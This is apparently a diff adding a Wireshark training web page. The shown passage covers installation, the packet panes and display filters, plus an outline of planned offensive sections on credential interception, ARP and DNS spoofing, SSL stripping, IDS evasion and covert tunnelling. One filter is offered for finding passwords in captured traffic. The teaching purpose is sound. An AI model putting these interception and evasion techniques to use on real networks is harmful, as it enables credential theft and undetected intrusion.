@@ -1,0 +1,1461 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+<meta name="description" content="CyberBootcamp — Wireshark Deep Dive: Lab Practicals, Offensive Security, Bypass & Defence"/>
+<title>CyberBootcamp — Wireshark Deep Dive</title>
+<link rel="preconnect" href="https://fonts.googleapis.com"/>
+<link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;500;600;700&family=IBM+Plex+Sans:wght@300;400;500;600;700&family=IBM+Plex+Sans+Condensed:wght@600;700&display=swap" rel="stylesheet"/>
+<style>
+/* ── Wireshark signature palette: deep navy + packet-capture amber + wire-blue ── */
+:root{
+  --bg:       #030609;
+  --surface:  #060c12;
+  --card:     #09111a;
+  --border:   #0f1e2d;
+  --accent:   #1a9dff;   /* Wireshark interface blue */
+  --amber:    #ffb830;   /* packet highlight amber */
+  --green:    #39d353;   /* captured/live green */
+  --red:      #ff4f5e;   /* malicious / alert */
+  --purple:   #b48eff;   /* encrypted / TLS */
+  --teal:     #00d4aa;   /* filter syntax */
+  --text:     #a8c4d8;
+  --muted:    #1a3045;
+  --mono:     'IBM Plex Mono', monospace;
+  --sans:     'IBM Plex Sans', sans-serif;
+  --display:  'IBM Plex Sans Condensed', sans-serif;
+}
+
+*{margin:0;padding:0;box-sizing:border-box;}
+body{background:var(--bg);color:var(--text);font-family:var(--sans);font-size:15px;line-height:1.7;min-height:100vh;}
+
+/* Signature: packet-stream scanline effect in background */
+body::before{
+  content:'';position:fixed;inset:0;
+  background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(26,157,255,0.012) 2px,rgba(26,157,255,0.012) 4px);
+  pointer-events:none;z-index:0;
+}
+
+/* ── HEADER ── */
+header{background:rgba(3,6,9,0.97);border-bottom:1px solid var(--border);padding:0 2rem;position:sticky;top:0;z-index:200;backdrop-filter:blur(12px);}
+.hi{max-width:1200px;margin:0 auto;display:flex;align-items:center;justify-content:space-between;height:58px;}
+.logo{font-family:var(--mono);font-size:0.78rem;font-weight:700;color:var(--accent);letter-spacing:0.06em;}
+.logo span{color:var(--muted);}
+.live-badge{display:flex;align-items:center;gap:0.5rem;font-family:var(--mono);font-size:0.6rem;color:var(--green);border:1px solid rgba(57,211,83,0.3);padding:4px 12px;letter-spacing:0.12em;background:rgba(57,211,83,0.05);}
+.live-dot{width:6px;height:6px;border-radius:50%;background:var(--green);animation:pulse 1.5s infinite;}
+@keyframes pulse{0%,100%{opacity:1;}50%{opacity:0.3;}}
+
+/* ── HERO ── */
+.hero{max-width:1200px;margin:0 auto;padding:4rem 2rem 2.5rem;position:relative;z-index:1;}
+.hero-eyebrow{font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.28em;margin-bottom:0.8rem;}
+.hero h1{font-family:var(--display);font-size:clamp(2.2rem,5.5vw,4.5rem);color:#fff;font-weight:700;line-height:0.95;letter-spacing:0.01em;margin-bottom:1rem;}
+.hero h1 .ws{color:var(--accent);}
+.hero h1 .cap{color:var(--amber);}
+.hero-sub{max-width:580px;color:var(--muted);font-size:0.9rem;line-height:1.75;margin-bottom:1.8rem;}
+.hero-tags{display:flex;gap:0.4rem;flex-wrap:wrap;}
+.tag{font-family:var(--mono);font-size:0.6rem;padding:4px 10px;border-radius:2px;letter-spacing:0.06em;border-width:1px;border-style:solid;}
+.t-blue  {background:rgba(26,157,255,0.09);color:var(--accent); border-color:rgba(26,157,255,0.25);}
+.t-amber {background:rgba(255,184,48,0.08);color:var(--amber);  border-color:rgba(255,184,48,0.22);}
+.t-green {background:rgba(57,211,83,0.07); color:var(--green);  border-color:rgba(57,211,83,0.2);}
+.t-red   {background:rgba(255,79,94,0.07); color:var(--red);    border-color:rgba(255,79,94,0.2);}
+.t-purple{background:rgba(180,142,255,0.08);color:var(--purple);border-color:rgba(180,142,255,0.22);}
+.t-teal  {background:rgba(0,212,170,0.07); color:var(--teal);   border-color:rgba(0,212,170,0.2);}
+
+/* ── OUTLINE TABLE ── */
+.outline-wrap{max-width:1200px;margin:0 auto;padding:0 2rem 2rem;position:relative;z-index:1;}
+.outline-box{background:var(--card);border:1px solid var(--border);border-radius:4px;overflow:hidden;}
+.outline-hdr{background:var(--surface);padding:0.85rem 1.4rem;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.outline-hdr-l{font-family:var(--mono);font-size:0.61rem;color:var(--accent);letter-spacing:0.2em;}
+.outline-hdr-r{font-family:var(--mono);font-size:0.59rem;color:var(--muted);}
+.otbl{width:100%;border-collapse:collapse;font-size:0.81rem;}
+.otbl th{background:var(--surface);color:var(--teal);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.13em;text-align:left;padding:9px 13px;border:1px solid var(--border);}
+.otbl td{padding:10px 13px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+.otbl tr:nth-child(even) td{background:rgba(255,255,255,0.012);}
+.otbl tr:hover td{background:rgba(26,157,255,0.03);}
+.os{font-family:var(--mono);font-size:0.73rem;font-weight:700;color:var(--accent);}
+.ot{font-weight:600;color:#d0e8ff;}
+.ok{font-family:var(--mono);font-size:0.72rem;color:var(--teal);}
+.phase-badge{font-family:var(--mono);font-size:0.58rem;padding:2px 8px;border-radius:2px;border-width:1px;border-style:solid;white-space:nowrap;}
+.ph-lab {background:rgba(57,211,83,0.08);color:var(--green);border-color:rgba(57,211,83,0.2);}
+.ph-off {background:rgba(255,79,94,0.08);color:var(--red);border-color:rgba(255,79,94,0.2);}
+.ph-byp {background:rgba(180,142,255,0.09);color:var(--purple);border-color:rgba(180,142,255,0.22);}
+.ph-def {background:rgba(26,157,255,0.08);color:var(--accent);border-color:rgba(26,157,255,0.22);}
+
+/* ── SECTION NAV ── */
+.snav{max-width:1200px;margin:0 auto;padding:0 2rem;display:flex;border-bottom:1px solid var(--border);position:relative;z-index:1;overflow-x:auto;gap:0;}
+.stab{font-family:var(--mono);font-size:0.62rem;padding:11px 14px;border:none;background:transparent;color:var(--muted);cursor:pointer;border-bottom:2px solid transparent;transition:all 0.15s;white-space:nowrap;letter-spacing:0.04em;}
+.stab:hover{color:var(--text);}
+.stab.on{border-bottom-color:var(--accent);color:var(--accent);}
+.stab.on.off-tab{border-bottom-color:var(--red);color:var(--red);}
+.stab.on.byp-tab{border-bottom-color:var(--purple);color:var(--purple);}
+.stab.on.def-tab{border-bottom-color:var(--green);color:var(--green);}
+
+/* ── CONTENT ── */
+.wrap{max-width:1200px;margin:0 auto;padding:2.5rem 2rem;position:relative;z-index:1;}
+.pnl{display:none;}.pnl.on{display:block;}
+
+/* ── SECTION HEADER ── */
+.sh{display:flex;gap:1.5rem;align-items:flex-start;margin-bottom:2rem;padding-bottom:1.5rem;border-bottom:1px solid var(--border);}
+.sh-num{font-family:var(--mono);font-size:3.5rem;line-height:0.85;opacity:0.08;min-width:90px;font-weight:700;}
+.sh-num.blue{color:var(--accent);}
+.sh-num.red{color:var(--red);}
+.sh-num.purple{color:var(--purple);}
+.sh-num.green{color:var(--green);}
+.sh-info h2{font-family:var(--display);font-size:1.5rem;color:#fff;font-weight:700;letter-spacing:0.03em;margin-bottom:0.35rem;}
+.sh-info p{color:var(--muted);font-size:0.84rem;}
+.stag{font-family:var(--mono);font-size:0.58rem;padding:2px 8px;margin-right:4px;border-radius:2px;letter-spacing:0.08em;border-width:1px;border-style:solid;}
+
+/* ── WIRESHARK CAPTURE SIM ── */
+.ws-window{background:#0a1520;border:1px solid var(--border);border-radius:4px;overflow:hidden;margin:1rem 0;font-family:var(--mono);}
+.ws-titlebar{background:#0e1e2e;padding:6px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;justify-content:space-between;}
+.ws-title{font-size:0.65rem;color:var(--muted);letter-spacing:0.08em;}
+.ws-controls{display:flex;gap:5px;}
+.wsc{width:11px;height:11px;border-radius:50%;}
+.wsc-r{background:#ff5f56;}.wsc-y{background:#ffbd2e;}.wsc-g{background:#27c93f;}
+.ws-toolbar{background:#0c1a28;padding:6px 14px;border-bottom:1px solid var(--border);display:flex;align-items:center;gap:0.5rem;}
+.ws-filter-box{flex:1;background:#060e16;border:1px solid rgba(26,157,255,0.3);border-radius:2px;padding:3px 10px;font-family:var(--mono);font-size:0.7rem;color:var(--teal);}
+.ws-filter-label{font-size:0.6rem;color:var(--muted);font-family:var(--mono);}
+.ws-apply{font-family:var(--mono);font-size:0.62rem;padding:3px 10px;background:rgba(26,157,255,0.12);border:1px solid rgba(26,157,255,0.3);color:var(--accent);border-radius:2px;cursor:pointer;}
+
+/* Packet list */
+.ws-packets{overflow-x:auto;}
+.ws-cols{display:grid;grid-template-columns:50px 80px 120px 120px 55px 80px 1fr;gap:0;background:#0e1e2e;border-bottom:1px solid var(--border);}
+.ws-col-h{font-family:var(--mono);font-size:0.58rem;color:var(--muted);padding:5px 8px;letter-spacing:0.1em;border-right:1px solid var(--border);}
+.ws-col-h:last-child{border-right:none;}
+.ws-packet{display:grid;grid-template-columns:50px 80px 120px 120px 55px 80px 1fr;gap:0;border-bottom:1px solid rgba(255,255,255,0.03);transition:background 0.12s;cursor:pointer;}
+.ws-packet:hover{background:rgba(26,157,255,0.06);}
+.ws-packet.selected{background:rgba(26,157,255,0.1);}
+.ws-packet.http {background:rgba(255,255,255,0.02);}
+.ws-packet.tcp  {background:rgba(26,157,255,0.03);}
+.ws-packet.dns  {background:rgba(57,211,83,0.03);}
+.ws-packet.arp  {background:rgba(255,184,48,0.03);}
+.ws-packet.tls  {background:rgba(180,142,255,0.03);}
+.ws-packet.icmp {background:rgba(0,212,170,0.03);}
+.ws-packet.alert{background:rgba(255,79,94,0.08)!important;}
+.ws-cell{font-family:var(--mono);font-size:0.68rem;padding:5px 8px;border-right:1px solid rgba(255,255,255,0.03);color:var(--text);white-space:nowrap;overflow:hidden;text-overflow:ellipsis;}
+.ws-cell:last-child{border-right:none;white-space:normal;}
+.ws-cell.num{color:var(--muted);}
+.ws-cell.proto-http{color:#7ecfff;}
+.ws-cell.proto-tcp{color:var(--accent);}
+.ws-cell.proto-dns{color:var(--green);}
+.ws-cell.proto-arp{color:var(--amber);}
+.ws-cell.proto-tls{color:var(--purple);}
+.ws-cell.proto-icmp{color:var(--teal);}
+.ws-cell.proto-ftp{color:#ff9d5c;}
+.ws-cell.alert-cell{color:var(--red);}
+
+/* Packet detail pane */
+.ws-detail{background:#060e16;border-top:1px solid var(--border);padding:1rem 1.4rem;font-family:var(--mono);font-size:0.72rem;line-height:1.9;color:var(--muted);display:none;}
+.ws-detail.show{display:block;}
+.wd-tree{padding-left:1rem;border-left:1px solid var(--border);margin:0.2rem 0;}
+.wd-key{color:var(--accent);}.wd-val{color:var(--text);}
+.wd-warn{color:var(--red);}
+
+/* ── FILTER REFERENCE ── */
+.filter-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(300px,1fr));gap:0.8rem;margin:1rem 0;}
+.filter-card{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1rem 1.2rem;}
+.fc-filter{font-family:var(--mono);font-size:0.78rem;color:var(--teal);margin-bottom:0.3rem;word-break:break-all;}
+.fc-desc{font-size:0.8rem;color:var(--muted);}
+.fc-example{font-family:var(--mono);font-size:0.68rem;color:var(--amber);margin-top:0.4rem;padding:3px 8px;background:rgba(255,184,48,0.06);border-radius:2px;word-break:break-all;}
+
+/* ── TERMINAL ── */
+.trm{background:#02080f;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.tbar{background:#040c14;padding:7px 14px;display:flex;align-items:center;gap:6px;border-bottom:1px solid var(--border);}
+.d{width:9px;height:9px;border-radius:50%;}
+.dr{background:#ff5f56;}.dy{background:#ffbd2e;}.dg{background:#27c93f;}
+.ttl{font-family:var(--mono);font-size:0.61rem;color:var(--muted);margin-left:6px;letter-spacing:0.1em;}
+.tbody{padding:1.2rem 1.4rem;font-family:var(--mono);font-size:0.76rem;line-height:2.1;color:#0d2030;}
+.pr{color:var(--green);}.cm{color:#9ac8e0;}.co{color:#0a1e30;}
+.ha{color:var(--accent);}.hc{color:var(--red);}.ham{color:var(--amber);}
+.hl2{color:var(--teal);}.hb{color:var(--accent);}.hg{color:var(--muted);}
+.hp{color:var(--purple);}
+
+/* ── CARD ── */
+.card{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.5rem;margin-bottom:1.2rem;}
+.clbl{font-family:var(--mono);font-size:0.61rem;color:var(--teal);letter-spacing:0.2em;margin-bottom:0.9rem;display:flex;align-items:center;gap:0.5rem;}
+.clbl::before{content:'//';color:var(--muted);}
+.card h3{font-size:1rem;font-weight:700;color:#d0e8ff;margin-bottom:0.5rem;}
+.card p{color:var(--text);font-size:0.87rem;margin-bottom:0.5rem;}
+.card p:last-child{margin-bottom:0;}
+
+/* ── CALLOUT ── */
+.note{display:flex;gap:1rem;align-items:flex-start;padding:1rem 1.2rem;border-radius:3px;margin:1rem 0;font-size:0.85rem;border-width:1px;border-style:solid;}
+.ni{background:rgba(26,157,255,0.05);border-color:rgba(26,157,255,0.18);}
+.nw{background:rgba(255,184,48,0.05);border-color:rgba(255,184,48,0.2);}
+.nd{background:rgba(255,79,94,0.05);border-color:rgba(255,79,94,0.2);}
+.ng{background:rgba(57,211,83,0.04);border-color:rgba(57,211,83,0.15);}
+.np{background:rgba(180,142,255,0.06);border-color:rgba(180,142,255,0.2);}
+.nico{font-size:1rem;line-height:1.6;flex-shrink:0;}
+.note p{color:var(--text);margin:0;}.note strong{color:#fff;}
+
+/* ── CHECKLIST ── */
+.ck{list-style:none;margin:0.8rem 0;}
+.ck li{display:flex;align-items:flex-start;gap:0.7rem;padding:0.42rem 0;font-size:0.85rem;color:var(--text);border-bottom:1px solid rgba(255,255,255,0.04);}
+.ck li:last-child{border-bottom:none;}
+.ck li::before{content:'>';color:var(--teal);flex-shrink:0;font-family:var(--mono);font-size:0.8rem;padding-top:1px;}
+
+/* ── ATTACK FLOW ── */
+.attack-flow{display:flex;flex-direction:column;gap:0;border:1px solid var(--border);border-radius:3px;overflow:hidden;margin:1rem 0;}
+.af-step{display:grid;grid-template-columns:44px 160px 1fr;border-bottom:1px solid var(--border);}
+.af-step:last-child{border-bottom:none;}
+.af-n{display:flex;align-items:center;justify-content:center;font-family:var(--mono);font-size:0.9rem;font-weight:700;background:var(--surface);border-right:1px solid var(--border);}
+.af-n.red{color:var(--red);}
+.af-n.amber{color:var(--amber);}
+.af-n.purple{color:var(--purple);}
+.af-label{font-family:var(--mono);font-size:0.7rem;display:flex;align-items:center;padding:11px 14px;background:var(--surface);border-right:1px solid var(--border);color:#d0e8ff;font-weight:700;word-break:break-word;}
+.af-desc{padding:11px 14px;font-size:0.82rem;color:var(--text);}
+.af-cmd{font-family:var(--mono);font-size:0.7rem;color:var(--teal);display:inline-block;margin-top:0.4rem;background:rgba(0,212,170,0.05);border:1px solid rgba(0,212,170,0.15);padding:2px 8px;border-radius:2px;word-break:break-all;}
+
+/* ── QUIZ ── */
+.qb{background:var(--card);border:1px solid var(--border);border-radius:3px;padding:1.4rem;margin-bottom:1rem;}
+.qt{font-size:0.88rem;font-weight:600;color:#d0e8ff;margin-bottom:1rem;}
+.qopts{display:flex;flex-direction:column;gap:0.44rem;}
+.qo{display:flex;align-items:flex-start;gap:0.65rem;padding:0.6rem 1rem;border:1px solid var(--border);border-radius:2px;cursor:pointer;font-size:0.81rem;color:var(--text);transition:all 0.14s;user-select:none;}
+.qo:hover{border-color:var(--accent);color:#fff;background:rgba(26,157,255,0.04);}
+.qo.correct{border-color:var(--green);background:rgba(57,211,83,0.07);color:var(--green);}
+.qo.wrong{border-color:var(--red);background:rgba(255,79,94,0.07);color:var(--red);}
+.qk{font-family:var(--mono);font-size:0.67rem;color:var(--muted);min-width:16px;flex-shrink:0;padding-top:1px;}
+.qfb{margin-top:0.8rem;font-size:0.79rem;padding:0.6rem 1rem;border-radius:2px;display:none;border-width:1px;border-style:solid;}
+.qfb.show{display:block;}
+.qfb.correct{background:rgba(57,211,83,0.07);color:var(--green);border-color:rgba(57,211,83,0.2);}
+.qfb.wrong{background:rgba(255,79,94,0.08);color:var(--red);border-color:rgba(255,79,94,0.22);}
+
+/* ── TABLE ── */
+.tbl{width:100%;border-collapse:collapse;font-size:0.81rem;margin:1rem 0;}
+.tbl th{background:var(--surface);color:var(--teal);font-family:var(--mono);font-size:0.6rem;letter-spacing:0.13em;text-align:left;padding:9px 13px;border:1px solid var(--border);}
+.tbl td{padding:9px 13px;border:1px solid var(--border);color:var(--text);vertical-align:top;}
+.tbl tr:nth-child(even) td{background:rgba(255,255,255,0.013);}
+.tbl tr:hover td{background:rgba(26,157,255,0.025);}
+
+/* ── SECTION LABEL ── */
+.slbl{font-family:var(--mono);font-size:0.61rem;color:var(--muted);letter-spacing:0.25em;margin:2rem 0 0.8rem;}
+
+/* ── TWO COL ── */
+.two{display:grid;grid-template-columns:1fr 1fr;gap:1rem;}
+@media(max-width:720px){.two{grid-template-columns:1fr;}.ws-cols,.ws-packet{grid-template-columns:40px 70px 90px 90px 45px 65px 1fr;}.sh-num{font-size:2.5rem;min-width:65px;}.af-step{grid-template-columns:40px 1fr;}.af-label{display:none;}}
+
+/* helpers */
+.hl{color:var(--accent);font-weight:600;}
+.hcr{color:var(--red);font-weight:600;}
+.ham2{color:var(--amber);font-weight:600;}
+.htl{color:var(--teal);font-weight:600;}
+.hgn{color:var(--green);font-weight:600;}
+.hpp{color:var(--purple);font-weight:600;}
+code{font-family:var(--mono);font-size:0.82em;color:var(--teal);background:rgba(0,212,170,0.07);padding:1px 5px;border-radius:2px;}
+
+/* back to top */
+#btt{position:fixed;bottom:1.5rem;right:1.5rem;width:44px;height:44px;border-radius:50%;background:rgba(3,6,9,0.85);backdrop-filter:blur(10px);border:1px solid rgba(26,157,255,0.3);color:var(--accent);font-size:1.1rem;display:flex;align-items:center;justify-content:center;cursor:pointer;text-decoration:none;opacity:0;pointer-events:none;transition:opacity 0.3s,transform 0.2s;z-index:999;}
+#btt.show{opacity:1;pointer-events:auto;}
+#btt:hover{transform:translateY(-3px);}
+
+footer{border-top:1px solid var(--border);padding:1.5rem 2rem;text-align:center;font-family:var(--mono);font-size:0.62rem;color:var(--muted);letter-spacing:0.1em;max-width:1200px;margin:3rem auto 0;position:relative;z-index:1;}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="hi">
+    <div class="logo">CYBER<span>BOOT</span>CAMP // <span>WIRESHARK</span></div>
+    <div class="live-badge"><div class="live-dot"></div>PACKET CAPTURE ACTIVE</div>
+  </div>
+</header>
+
+<div class="hero">
+  <div class="hero-eyebrow">// NETWORK FORENSICS · PROTOCOL ANALYSIS · OFFENSIVE & DEFENSIVE</div>
+  <h1><span class="ws">Wire</span><span class="cap">shark</span><br/>Deep Dive</h1>
+  <p class="hero-sub">From reading your first capture to intercepting credentials, evading detection, and building a defensive monitoring workflow. Eight structured sections — lab practicals first, then offensive, then bypass, then defence.</p>
+  <div class="hero-tags">
+    <span class="tag t-green">§1–2 Lab Practicals</span>
+    <span class="tag t-red">§3–4 Offensive</span>
+    <span class="tag t-amber">§5 Credential Harvest</span>
+    <span class="tag t-purple">§6–7 Bypass</span>
+    <span class="tag t-blue">§8 Defensive</span>
+  </div>
+</div>
+
+<!-- OUTLINE TABLE -->
+<div class="outline-wrap">
+  <div class="outline-box">
+    <div class="outline-hdr">
+      <span class="outline-hdr-l">WIRESHARK — SECTION OUTLINE</span>
+      <span class="outline-hdr-r">8 SECTIONS · PRACTICAL + OFFENSIVE + BYPASS + DEFENSIVE</span>
+    </div>
+    <table class="otbl">
+      <thead><tr><th style="width:55px">SEC</th><th style="width:60px">PHASE</th><th style="width:220px">TOPIC</th><th>WHAT YOU LEARN</th><th style="width:175px">KEY SKILLS</th></tr></thead>
+      <tbody>
+        <tr><td class="os">§1</td><td><span class="phase-badge ph-lab">LAB</span></td><td class="ot">Interface & Capture Basics</td><td>Installing Wireshark, selecting the right interface, capture filters vs display filters, reading the packet list/detail/bytes panes, saving and loading PCAP files.</td><td class="ok">Capture setup, PCAP files, UI navigation</td></tr>
+        <tr><td class="os">§2</td><td><span class="phase-badge ph-lab">LAB</span></td><td class="ot">Protocol Analysis & Interpretation</td><td>Decoding TCP 3-way handshake, HTTP request/response pairs, DNS query/answer chains, ARP tables, TLS handshake fields, ICMP echo/reply. Reading real packet bytes. Understanding protocol layers in the tree view.</td><td class="ok">TCP, HTTP, DNS, ARP, TLS, ICMP</td></tr>
+        <tr><td class="os">§3</td><td><span class="phase-badge ph-off">OFFENSIVE</span></td><td class="ot">Passive Reconnaissance</td><td>Using Wireshark to map a network passively — identifying hosts, services, operating systems, and usernames from ambient traffic without sending a single packet. ARP poisoning for traffic redirection.</td><td class="ok">Host discovery, OS fingerprinting, ARP</td></tr>
+        <tr><td class="os">§4</td><td><span class="phase-badge ph-off">OFFENSIVE</span></td><td class="ot">Credential Interception</td><td>Capturing plaintext credentials from FTP, HTTP Basic Auth, Telnet, POP3, SMTP. Following TCP streams. Exporting objects (files transferred over HTTP). SMB credential capture. Cookie theft from HTTP sessions.</td><td class="ok">FTP, HTTP auth, Follow TCP stream, SMB</td></tr>
+        <tr><td class="os">§5</td><td><span class="phase-badge ph-off">OFFENSIVE</span></td><td class="ot">MITM & Traffic Injection</td><td>ARP spoofing to position between two hosts. Intercepting and modifying HTTP responses in flight. DNS spoofing to redirect traffic. SSL stripping basics. Combining with ettercap/bettercap for automated MITM.</td><td class="ok">ARP spoof, DNS spoof, SSL strip, ettercap</td></tr>
+        <tr><td class="os">§6</td><td><span class="phase-badge ph-byp">BYPASS</span></td><td class="ot">Evading Wireshark & IDS Detection</td><td>Fragmentation attacks to split payloads across packets. Encoding/encrypting C2 traffic to look like HTTPS. Using legitimate ports and protocols for covert channels. Timing-based evasion. Decoy traffic generation.</td><td class="ok">Fragmentation, covert channels, timing</td></tr>
+        <tr><td class="os">§7</td><td><span class="phase-badge ph-byp">BYPASS</span></td><td class="ot">Encrypted & Tunnelled Traffic</td><td>DNS tunnelling (iodine/dnscat2) — how data hides inside DNS queries. ICMP tunnelling. Using HTTPS for C2 beaconing — how it looks in Wireshark and why it's hard to detect. Decrypting TLS with SSLKEYLOGFILE.</td><td class="ok">DNS tunnel, ICMP tunnel, TLS decrypt</td></tr>
+        <tr><td class="os">§8</td><td><span class="phase-badge ph-def">DEFENSIVE</span></td><td class="ot">Detection, Alerting & Forensics</td><td>Writing Wireshark display filter rules for known attack patterns. Using Statistics > Conversations and I/O graphs to spot anomalies. Integrating with Zeek/Bro for automated log generation. PCAP-based incident reconstruction. Writing Snort rules from Wireshark findings.</td><td class="ok">Detection filters, Zeek, Snort, forensics</td></tr>
+      </tbody>
+    </table>
+  </div>
+</div>
+
+<!-- SECTION NAV -->
+<div class="snav">
+  <button class="stab on"      onclick="show(0)">§1 Capture Basics</button>
+  <button class="stab"         onclick="show(1)">§2 Protocol Analysis</button>
+  <button class="stab off-tab" onclick="show(2)">§3 Passive Recon</button>
+  <button class="stab off-tab" onclick="show(3)">§4 Credentials</button>
+  <button class="stab off-tab" onclick="show(4)">§5 MITM</button>
+  <button class="stab byp-tab" onclick="show(5)">§6 Evasion</button>
+  <button class="stab byp-tab" onclick="show(6)">§7 Tunnelling</button>
+  <button class="stab def-tab" onclick="show(7)">§8 Defensive</button>
+</div>
+
+<div class="wrap">
+
+<!-- ══════════ §1 CAPTURE BASICS ══════════ -->
+<div class="pnl on" id="p0">
+  <div class="sh">
+    <div class="sh-num blue">01</div>
+    <div class="sh-info">
+      <h2>Interface & Capture Basics</h2>
+      <p><span class="stag t-green">LAB PRACTICAL</span> Installation · Interface Selection · Filters · PCAP Files · UI Navigation</p>
+    </div>
+  </div>
+
+  <div class="note ni">
+    <div class="nico">🦈</div>
+    <p><strong>Wireshark is the most important tool in network security.</strong> Every other skill in this bootcamp — enumeration, exploitation, detection — produces network traffic. Wireshark lets you see that traffic at the raw packet level. Defenders use it to reconstruct attacks. Attackers use it to find credentials and map networks. Everyone needs to be fluent in it.</p>
+  </div>
+
+  <div class="slbl">// §1.1 — INSTALLATION</div>
+  <div class="trm">
+    <div class="tbar"><div class="d dr"></div><div class="d dy"></div><div class="d dg"></div><div class="ttl">INSTALL WIRESHARK</div></div>
+    <div class="tbody"><span class="co"># ── KALI LINUX (pre-installed, update it) ────────────────────</span>
+<span class="pr">$</span> <span class="cm">sudo apt update && sudo apt install wireshark -y</span>
+<span class="co"># When asked "Should non-superusers be able to capture packets?" → YES</span>
+<span class="pr">$</span> <span class="cm">sudo usermod -aG wireshark $USER</span>   <span class="co"># Add yourself to wireshark group</span>
+<span class="pr">$</span> <span class="cm">newgrp wireshark</span>                    <span class="co"># Apply group without relogging</span>
+
+<span class="co"># ── UBUNTU / DEBIAN ──────────────────────────────────────────</span>
+<span class="pr">$</span> <span class="cm">sudo add-apt-repository ppa:wireshark-dev/stable</span>
+<span class="pr">$</span> <span class="cm">sudo apt install wireshark tshark -y</span>
+
+<span class="co"># ── WINDOWS / MAC ─────────────────────────────────────────────
+# Download from: wireshark.org/download.html
+# Windows: installs WinPcap/Npcap driver automatically
+# Mac: installs ChmodBPF for non-root capture</span>
+
+<span class="co"># ── TSHARK (terminal-only Wireshark) ─────────────────────────</span>
+<span class="pr">$</span> <span class="cm">tshark -i eth0 -c 100</span>    <span class="co"># Capture 100 packets on eth0</span>
+<span class="pr">$</span> <span class="cm">tshark -r capture.pcap</span>   <span class="co"># Read a PCAP file</span>
+<span class="co"># tshark is Wireshark without the GUI — useful for scripting and remote capture</span></div>
+  </div>
+
+  <div class="slbl">// §1.2 — THE THREE PANES</div>
+  <div class="two">
+    <div class="card">
+      <div class="clbl">PACKET LIST (top pane)</div>
+      <p>One row per packet. Columns: No., Time, Source, Destination, Protocol, Length, Info. This is your overview. Colour-coded by protocol — green for TCP, light blue for DNS, etc. Click any row to expand it in the detail pane below.</p>
+      <p style="margin-top:0.5rem"><span class="hl">Key shortcut:</span> <code>Ctrl+F</code> to search within packets. <code>Ctrl+G</code> to go to packet number.</p>
+    </div>
+    <div class="card">
+      <div class="clbl">PACKET DETAILS (middle pane)</div>
+      <p>Tree view of the selected packet showing every protocol layer — Frame → Ethernet → IP → TCP → HTTP. Expand each layer to see all fields and values. This is where you read headers, flags, sequence numbers, and payload.</p>
+      <p style="margin-top:0.5rem"><span class="hl">Right-click any field</span> → "Apply as filter" → instantly filters the packet list to matching packets.</p>
+    </div>
+  </div>
+  <div class="card">
+    <div class="clbl">PACKET BYTES (bottom pane)</div>
+    <p>Raw hexadecimal and ASCII representation of the selected packet. When you click a field in the detail pane, the corresponding bytes are highlighted here. This is how you read raw credentials, file contents, and protocol payloads at the byte level. Essential for understanding what's actually on the wire.</p>
+  </div>
+
+  <div class="slbl">// §1.3 — CAPTURE FILTERS vs DISPLAY FILTERS</div>
+  <div class="note nw">
+    <div class="nico">⚠️</div>
+    <p><strong>This is the most important distinction in Wireshark.</strong> Capture filters limit what gets captured — they run at the kernel level and can't be changed mid-capture. Display filters operate on already-captured packets — you can change them at any time without losing data. Always capture everything, filter the display.</p>
+  </div>
+
+  <table class="tbl">
+    <tr><th>TYPE</th><th>WHEN APPLIED</th><th>SYNTAX</th><th>EXAMPLE</th><th>USE CASE</th></tr>
+    <tr><td><span class="hgn">Capture Filter</span></td><td>Before capture starts</td><td>BPF syntax</td><td><code>port 80</code></td><td>High-traffic networks where you only want one protocol</td></tr>
+    <tr><td><span class="hl">Display Filter</span></td><td>After/during capture</td><td>Wireshark syntax</td><td><code>http.request</code></td><td>Almost always — filter what you see without losing data</td></tr>
+  </table>
+
+  <div class="slbl">// §1.4 — ESSENTIAL DISPLAY FILTERS</div>
+  <div class="filter-grid">
+    <div class="filter-card">
+      <div class="fc-filter">http</div>
+      <div class="fc-desc">Show all HTTP traffic</div>
+      <div class="fc-example">Reveals web browsing, APIs, file downloads</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">http.request.method == "POST"</div>
+      <div class="fc-desc">Show only HTTP POST requests</div>
+      <div class="fc-example">Login forms, file uploads — credentials live here</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">dns</div>
+      <div class="fc-desc">All DNS queries and responses</div>
+      <div class="fc-example">Domain lookups — maps what hosts are reaching out to</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">ip.addr == 192.168.1.50</div>
+      <div class="fc-desc">All traffic to or from a specific IP</div>
+      <div class="fc-example">Investigate one host — see everything it sends and receives</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">tcp.flags.syn == 1 && tcp.flags.ack == 0</div>
+      <div class="fc-desc">SYN packets only — connection initiation</div>
+      <div class="fc-example">Port scan detection — many SYNs from one IP in seconds</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">ftp || ftp-data</div>
+      <div class="fc-desc">All FTP control and data traffic</div>
+      <div class="fc-example">FTP sends credentials in plaintext — always check this</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">!(arp || icmp || dns)</div>
+      <div class="fc-desc">Exclude noisy protocols</div>
+      <div class="fc-example">Clear the noise to see application-layer traffic</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">tcp.analysis.flags</div>
+      <div class="fc-desc">Show TCP anomalies and errors</div>
+      <div class="fc-example">Retransmissions, out-of-order, RSTs — network issues</div>
+    </div>
+    <div class="filter-card">
+      <div class="fc-filter">frame contains "password"</div>
+      <div class="fc-desc">Search packet content for a string</div>
+      <div class="fc-example">Find credentials in any protocol — case sensitive</div>
+    </div>
+  </div>
+
+  <div class="slbl">// §1.5 — LIVE CAPTURE SIMULATION</div>
